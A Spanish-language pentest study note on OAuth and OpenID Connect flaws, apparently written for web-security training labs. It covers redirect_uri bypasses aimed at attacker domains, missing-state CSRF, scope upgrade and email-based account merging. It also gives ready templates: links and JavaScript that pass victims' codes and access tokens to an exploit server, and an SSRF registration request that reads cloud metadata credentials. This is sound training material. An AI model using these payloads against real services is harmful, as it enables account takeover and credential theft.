---
aliases:
  - OAuth
  - oauth-entrypoint
  - redirect_uri
tags:
  - vuln/oauth
  - entrypoint
---

# OAuth Authentication — Punto de entrada

> Documento **agnóstico al negocio**: *cómo funciona OAuth y cómo **explotarlo***. **Dónde** aplica (qué proveedor, qué endpoint concreto del target) → los `STAGE_x`. Los **labs** con objetivo y payloads → [[vulnerabilities/026-oauth/labs/README|labs de OAuth]].

## 🧠 Qué es y por qué se rompe

OAuth 2.0 es un protocolo de **delegación de acceso**: le permite a una app (el **cliente**) acceder a datos tuyos que viven en **otro** servicio, **sin** que le des tu contraseña. Como efecto colateral se usa muchísimo para **"Log in with Google/Facebook/…"** (social login).

El problema de fondo: OAuth es **muy flexible y fácil de implementar mal**. Mete un **tercero** en el login, y la seguridad depende de que **cada parte valide bien** lo que recibe de las otras. Cuando el cliente confía sin verificar (en un token, un `code`, o el perfil), o el servidor no valida a **dónde** manda las credenciales (`redirect_uri`), aparece la vuln.

### Los 3 roles (quién es quién)

| Rol | Quién es | En los labs |
| --- | --- | --- |
| **Resource owner** | El usuario dueño de los datos/identidad | vos / la víctima (`carlos`, `admin`) |
| **Client application** | La app que quiere acceder/loguearte | **el target** (el blog, la tienda) |
| **OAuth service** | Emite tokens y guarda la identidad. Se divide en **authorization server** (`/authorize`, `/token`) y **resource server** (`/userinfo`, `/me`) | `oauth-*.oauth-server.net` |

## 🔍 Recon — mapear el flujo antes de tocar nada

1. **Encontrá el flujo:** botón *"Log in with social media"* / *"Attach a social profile"*. En el **Proxy history** vas a ver un `GET /authorize` (o `/auth`) con `client_id`, `redirect_uri`, `response_type`, `scope`, `state`, y un `/callback` que vuelve con `?code=` o `#access_token=`.
2. **Metadata del servidor (RFC 8414 / OpenID Discovery)** — casi siempre pública, sin auth. Te lista **todos** los endpoints y capacidades:

```
GET /.well-known/oauth-authorization-server        ← OAuth 2.0 Authorization Server Metadata
GET /.well-known/openid-configuration              ← OpenID Connect Discovery
```

Mirá especialmente:
- `authorization_endpoint`, `token_endpoint`, `userinfo_endpoint`, `jwks_uri`
- `registration_endpoint` → ¿**dynamic client registration** abierto? (SSRF, ver abajo)
- `scopes_supported`, `response_types_supported`, `response_modes_supported` → ¿`token`? ¿`web_message`?
- `request_uri_parameter_supported: true` → superficie de **SSRF** por `request_uri`

## ⚙️ Cómo funciona (grant types)

El **grant type** es *el procedimiento* con que el cliente obtiene el token. Los dos que importan en pentest:

### Authorization code grant (el seguro)

```
1. Cliente → navegador → GET /authorize?client_id=..&redirect_uri=..&response_type=code&scope=..&state=..
2. Usuario se loguea/consiente en el OAuth service
3. OAuth service → 302 → redirect_uri?code=CODE&state=STATE          (el code viaja por el navegador)
4. Cliente (backend) → POST /token  (code + client_id + client_secret) → access_token   [server-to-server]
5. Cliente (backend) → GET /userinfo  (Authorization: Bearer access_token) → datos del usuario
```

> El `access_token` **nunca** pasa por el navegador. Robás el **`code`** (que sí pasa), pero el `code` es de **un solo uso** y hay que canjearlo rápido.

### Implicit grant (el inseguro)

```
1. GET /authorize?...&response_type=token
2. Login/consent
3. OAuth service → 302 → redirect_uri#access_token=TOKEN&token_type=Bearer   (el token viaja en el FRAGMENT)
4. El JS del cliente lee location.hash y manda el token/identidad a su backend
```

- El `access_token` **viaja por el navegador**, en el **fragment** (`#`). Más expuesto → más fácil de robar (necesitás JS que lea `location.hash`).
- Pensado para **SPAs / apps nativas** que no tienen backend para hacer el canje seguro. **Menos seguro** — hoy se desaconseja.

### OpenID Connect (capa de identidad encima de OAuth)

Añade autenticación "de verdad": con `scope=openid` el server devuelve un **`id_token`** (un **JWT** firmado con los claims del usuario: `sub`, `email`, etc.).
- `response_type=id_token` (o combos `id_token token`, `code id_token`).
- `response_mode`: `query` · `fragment` · `form_post` · **`web_message`** (devuelve el resultado por `postMessage` — clave para el ataque de proxy page).

### 🔑 Scopes

El `scope` define **qué** puede hacer el token. No hay estándar de nombres — cada proveedor inventa el suyo:

```
scope=contacts
scope=contacts.read
scope=contact-list-r
scope=https://oauth-authorization-server.com/auth/scopes/user/contacts.readonly
```

Con OpenID, los scopes estándar son `openid profile email address phone`.

---

## 💥 Vulnerabilidades

Se agrupan por **dónde** vive el fallo: en el **cliente**, en el **OAuth service**, o en **OpenID / dynamic registration**.

### A) En la **client application**

#### A.1 — Implementación incorrecta del implicit grant

Tras recibir el token, el cliente (JS) manda a **su** backend la **identidad del usuario** (email/`sub`) para crear la sesión. Si el backend **confía en ese dato** sin verificar que corresponde al token → **registrás una sesión a nombre de otro usuario**.

```
POST /authenticate
{ "email": "victima@dominio.net", "username": "wiener", "token": "TU-TOKEN" }
                 ↑ cambiás esto y sos la víctima
```

> Regla rota: el cliente **nunca** debe confiar en datos de usuario que le manda el front. Tiene que pedírselos al `/userinfo` **con el token**. → lab 1.

#### A.2 — Protección CSRF deficiente (falta de `state`)

El parámetro **`state`** es un valor **impredecible atado a tu sesión** que viaja en `/authorize` y vuelve en el `/callback`; el cliente lo compara para probar que **vos** iniciaste el flujo. Es **opcional** en la spec pero **muy recomendado**.

Si falta o no se valida → **CSRF**: forzás a la víctima a completar un `/callback` que **vos** preparaste. El caso clásico es **forced profile linking**: ligás **tu** cuenta social a la cuenta de la víctima → después entrás vos como ella. → lab 2. Misma familia que [[vulnerabilities/003-csrf/csrf|CSRF]].

### B) En el **OAuth service**

#### B.1 — Fuga de `code` / `access_token` (fallos de `redirect_uri`)

El `redirect_uri` dice **a dónde** el servidor entrega el `code`/`token`. Si se valida mal, lo apuntás a **tu server** y robás la credencial de la víctima. Bypasses, de más fácil a más sutil:

- **Sin validación** → cualquier URL: `redirect_uri=https://evil-user.net`.
- **Validación por substring/prefijo** → dominios que "empiezan/contienen" el permitido pero son tuyos:
  ```
  https://localhost.evil-user.net
  https://client-app.com.evil-user.net
  https://evil-user.net/client-app.com
  ```
- **Discrepancias de parser** (el validador y el redirector parsean la URL distinto — `@` de userinfo, `#` de fragment, espacios):
  ```
  https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/
  ```
- **Parámetro duplicado** (el validador chequea uno, el redirect usa el otro):
  ```
  /authorize?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net
  ```
- **`redirect_uri` estricto, pero hay un open redirect en el cliente** → path traversal para rebotar la credencial afuera manteniéndote en el dominio permitido:
  ```
  redirect_uri=https://client-app.com/oauth-callback/../post/next?path=https://evil-user.net
  ```
  Emparenta con [[vulnerabilities/025-dom-based/dom-based|open redirect]] → lab 4.

> Con `code` grant robás el `code` (labs 3). Con implicit robás el `token` del fragment (labs 4, 5). En ambos, el link/iframe **se lo entregás a la víctima** por el **exploit server**.

#### B.2 — `web_message` response mode

`response_mode=web_message` hace que el server devuelva el resultado por **`postMessage`** (se usa para *silent authentication* dentro de un iframe). Si la **página del cliente** que recibe ese mensaje **no valida el `origin`**, la iframeás desde tu server y **capturás el token** al escuchar el `message`. Es la base del ataque de **proxy page** → lab 5.

#### B.3 — Validación de scope deficiente (scope upgrade)

El token debe quedar atado al `scope` que el usuario **consintió**. Si el server no lo revalida, **alterás el scope**:
- **Code grant:** agregás scopes extra al **canjear el `code`** en `/token`, o al pedir un token nuevo con el **refresh token**.
- **Implicit:** cambiás el `scope` en la request inicial de `/authorize`.

Si el server acepta el scope inflado sin re-consentimiento → tu token tiene **más permisos** de los otorgados.

#### B.4 — Registro de usuario no verificado

Si el proveedor permite registrar cuentas con un **email sin verificar**, o si el cliente **matchea cuentas por email**: registrás una cuenta (en el cliente, sin OAuth, o en el proveedor) con el **email de la víctima**. Cuando la víctima entra con OAuth, el cliente **funde** ambas cuentas por email → **acceso a la misma cuenta** / takeover.

### C) OpenID — dynamic client registration & SSRF

#### C.1 — Dynamic client registration sin proteger

RFC 7591: el server permite **registrar clientes al vuelo** por `POST` al `registration_endpoint` (`/register`, `/reg`, `/openid/register`). Si está **abierto** (sin auth, o con un bearer que se filtra), controlás la **metadata del cliente**:

```
POST /openid/register HTTP/1.1
Host: oauth-authorization-server.com
Content-Type: application/json
Authorization: Bearer ab12cd34ef56gh89

{
  "application_type": "web",
  "redirect_uris": ["https://client-app.com/callback", "https://client-app.com/callback2"],
  "client_name": "My Application",
  "logo_uri": "https://client-app.com/logo.png",
  "token_endpoint_auth_method": "client_secret_basic",
  "jwks_uri": "https://client-app.com/my_public_keys.jwks",
  "userinfo_encrypted_response_alg": "RSA1_5",
  "userinfo_encrypted_response_enc": "A128CBC-HS256"
}
```

#### C.2 — SSRF por metadata del cliente

Varios campos de esa metadata son **URLs que el server fetchea** → **SSRF**. Apuntás cualquiera a un host interno o a la **metadata del cloud** (`http://169.254.169.254/…`):

- **`logo_uri`** — el server la busca para renderizar el logo del cliente → SSRF al mostrar el logo.
- **`jwks_uri`** — la fetchea para traer las claves públicas.
- **`sector_identifier_uri`** — la fetchea al registrar.
- **`request_uri`** (si `request_uri_parameter_supported: true`) — el server descarga el *request object* desde la URL que le pases en `/authorize?request_uri=…` → SSRF directo, sin ni siquiera registrar.

→ lab 6 (`logo_uri` → `169.254.169.254`). Emparenta con [[vulnerabilities/007-ssrf/ssrf|SSRF]].

---

## 🧪 Metodología rápida (checklist)

1. **Recon:** leé `/.well-known/openid-configuration` — endpoints, `response_types_supported`, `response_modes_supported`, `registration_endpoint`, `request_uri_parameter_supported`.
2. **¿`code` o `token`?** mirá `response_type` → decide si robás `code` (canje por `/token`) o `token` (JS que lee el fragment).
3. **Atacá el `redirect_uri`** (B.1): sin validar → substring → parser tricks → duplicado → open redirect del cliente. Es la palanca #1.
4. **¿Falta `state`?** (A.2) → CSRF / forced linking.
5. **¿El cliente confía en tu email/perfil?** (A.1) → cambialo en el POST y sé otro.
6. **¿`scope` re-validado?** (B.3) → intentá inflarlo en `/token` o `/authorize`.
7. **¿Matchea cuentas por email?** (B.4) → pre-registrá la cuenta de la víctima.
8. **¿`registration_endpoint` abierto / `request_uri` soportado?** (C) → SSRF por `logo_uri` / `request_uri` a `169.254.169.254`.

## 🐍 Plantillas (reemplazá lo resaltado)

**Robo de `code` por `redirect_uri` (code grant) — link para la víctima:**
```
https://OAUTH-ID.oauth-server.net/auth?client_id=CLIENT_ID&redirect_uri=https://TU-EXPLOIT-SERVER.exploit-server.net&response_type=code&scope=openid%20profile%20email
```
El `code` de la víctima cae en tu access log → lo canjeás en el `/callback` real del cliente.

**Robo de `token` por implicit + open redirect — página en el exploit server:**
```html
<script>
if (!document.location.hash) {
  window.location = 'https://OAUTH-ID.oauth-server.net/auth?client_id=CLIENT_ID'
    + '&redirect_uri=https://LAB-ID.web-security-academy.net/oauth-callback/../post/next'
    + '?path=https://TU-EXPLOIT-SERVER.exploit-server.net/exploit'
    + '&response_type=token&nonce=123&scope=openid%20profile%20email';
} else {
  window.location = '/?' + document.location.hash.substr(1);   // reenvía #access_token=... a tu log
}
</script>
```

**Forced profile linking (CSRF sin `state`) — PoC para el admin:**
```html
<iframe src="https://LAB-ID.web-security-academy.net/oauth-linking?code=TU-CODE"></iframe>
```

**SSRF por dynamic registration (`logo_uri` → metadata):**
```
POST /reg HTTP/1.1
Host: OAUTH-ID.oauth-server.net
Content-Type: application/json

{"redirect_uris":["https://LAB-ID.web-security-academy.net/oauth-callback"],
 "logo_uri":"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"}
```
Luego `GET /client/CLIENT_ID/logo` → la respuesta es el JSON de credenciales.

> [!note] Relación con otras vulns
> - **Open redirect** (DOM/server) = la munición clásica para saltarse un `redirect_uri` whitelisteado → [[vulnerabilities/025-dom-based/dom-based|DOM-based]] · [[vulnerabilities/025-dom-based/labs/README|labs open redirect]].
> - **CSRF** (falta de `state`, forced linking) → [[vulnerabilities/003-csrf/csrf|csrf]].
> - **SSRF** (dynamic registration por `logo_uri`/`request_uri`, u OIDC discovery) → [[vulnerabilities/007-ssrf/ssrf|ssrf]].
> - **JWT** (el `id_token` de OpenID es un JWT firmado → atacable si la validación es débil) → [[how-to-work/jwt|cómo funciona un JWT]] · [[vulnerabilities/018-jwt-attacks/jwt-attacks|ataques JWT]] · [[vulnerabilities/018-jwt-attacks/labs/README|labs JWT]].
> - El `code`/`token` robado y el linking forzado se **entregan por exploit server** (víctima/admin logueada visita) → misma mecánica de víctima que CSRF/clickjacking/XSS entregado.
> - **Toma de cuenta** en general → [[vulnerabilities/029-authentication/authentication|authentication]] · [[vulnerabilities/028-access-control/access-control|access control]].
